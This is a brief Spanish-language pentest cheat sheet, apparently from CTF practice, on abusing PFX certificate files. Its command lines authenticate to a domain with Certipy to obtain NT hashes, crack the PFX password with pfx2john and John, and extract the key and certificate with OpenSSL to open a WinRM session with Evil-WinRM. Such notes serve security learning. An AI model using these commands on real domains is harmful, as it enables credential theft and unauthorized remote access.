PFX

Uso de archivos PFX para autenticación con certificados, extracción de hashes y obtención de tickets Kerberos.

Info: PFX

Contenedor que incluye:

- Clave privada

- Certificado

- Cadena de certificados

Autenticación

Certipy

certipy-ad auth -pfx administrator.pfx -domain <domain.local> -dc-ip <dc_ip>

Solo funciona si el certificado es válido para autenticación y obtenemos su hash NT

Crackear

Normalmente se encuentra protegido bajo contraseña

John

pfx2john legacyy_dev_auth.pfx > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

Dumpear

Si no es válido para autenticarnos directamente, podemos extraer la clave privada y su certificado para autenticarnos vía WinRM.

OpenSSL y Evil-WinRM

# Extraer Clave Privada
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
# Extraer Certificado
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out priv-certificado.cert -nodes
# Conexión WINRM
evil-winrm -i dc01 -c certificado.cert -k priv-key.pem
